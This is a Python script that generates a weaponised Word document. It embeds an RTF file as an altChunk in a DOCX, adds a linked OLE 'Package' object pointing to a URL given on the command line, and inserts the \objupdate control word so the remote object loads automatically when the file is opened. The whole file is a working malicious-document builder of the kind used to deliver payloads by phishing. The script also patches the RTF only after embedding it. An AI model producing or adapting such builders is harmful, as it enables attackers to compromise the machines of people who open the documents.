import sys
import os
from docx import Document
from docx.oxml.parser import OxmlElement
from docx.oxml.ns import qn
from docx.opc.part import Part
from docx.opc.constants import RELATIONSHIP_TYPE as RT
import win32com.client as win32



def get_or_create_doc(docx_file_path):
    """Get or create a DOCX document."""
    if not os.path.isfile(docx_file_path):
        doc = Document()
        doc.save(docx_file_path)
        print(f"[+] Created a new DOCX document with name '{docx_file_path}'.")
    else:
        doc = Document(docx_file_path)
    return doc



def check_rtf_exists(rtf_file_path):
    """Check if the RTF file exists, and create it if it doesn't."""
    if not os.path.isfile(rtf_file_path):
        gen_new_rtf(rtf_file_path)



def gen_new_rtf(rtf_file_path):
    """Generate a new RTF file with default content."""
    try:
        with open(rtf_file_path, 'w') as file:
            rtf_example_code = "{\\rtf1\\ansi\\deff0}"
            file.write(rtf_example_code)
        print(f"[+] Created a new RTF document with name '{rtf_file_path}'.")
    except Exception as e:
        print(f"[-] Cannot create the RTF file. Error: {str(e)}")
        sys.exit(1)



def update_rtf_with_objupdate(file_path):
    """Update the RTF file by adding '\objupdate' after '\objautolink'."""
    try:
        with open(file_path, 'r') as file:
            file_content = file.read()


        updated_content = file_content.replace(r'\objautlink', r'\objautlink\objupdate')


        with open(file_path, 'w') as file:
            file.write(updated_content)


        print(f"[+] '\objupdate' added after '\objautolink' in '{file_path}'.")


    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")



def add_rtf_as_alt_chunk_to_doc(doc, rtf_path):
    """Add an RTF file as an altChunk to a DOCX document."""
    try:
        package = doc.part.package
        partname = package.next_partname('/word/altChunk%d.rtf')


        with open(rtf_path, 'rb') as rtf_file:
            rtf_content = rtf_file.read()


        alt_part = Part(partname, 'application/rtf', rtf_content, package)
        r_id = doc.part.relate_to(alt_part, RT.A_F_CHUNK)


        alt_chunk = OxmlElement('w:altChunk')
        alt_chunk.set(qn('r:id'), r_id)
        doc.element.body.sectPr.addprevious(alt_chunk)


        print("[+] RTF file added as altChunk.")


        doc.save(docx_file_path)


        update_rtf_with_objupdate(rtf_path)


    except Exception as e:
        print(f"[-] Can not add the RTF file as altChunk to the DOC. Error: {str(e)}")
        sys.exit(1)



def add_linked_ole_object_with_url(rtf_path, url):
    """Add a linked OLE object with a URL to the RTF file."""
    try:
        word = win32.Dispatch("Word.Application")
        doc = word.Documents.Open(os.path.abspath(rtf_path))
        doc.Activate()


        ole_shape = doc.Shapes.AddOLEObject(
            ClassType="Package",
            FileName=url,
            LinkToFile=True,
            DisplayAsIcon=True,
            Left=100, Top=100, Width=100, Height=100
        )


        doc.Save()
        doc.Close()
        word.Quit()


        print(f"[+] Linked OLE object with URL added to '{rtf_path}'.")


    except Exception as e:
        print(f"[-] Cannot add a linked OLE object to the RTF file. Error: {str(e)}")
        sys.exit(1)



if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python generate_rtf_with_autolink.py <doc_file> <rtf_file> <ole_objects_url>")
        sys.exit(1)


    docx_file_path = sys.argv[1]
    rtf_file_path = sys.argv[2]
    url = sys.argv[3]


    doc = get_or_create_doc(docx_file_path)
    check_rtf_exists(rtf_file_path)


    add_linked_ole_object_with_url(rtf_file_path, url)
    add_rtf_as_alt_chunk_to_doc(doc, rtf_file_path)


    print(f"[+] RTF file '{rtf_file_path}' added as altChunk to '{docx_file_path}'.")
 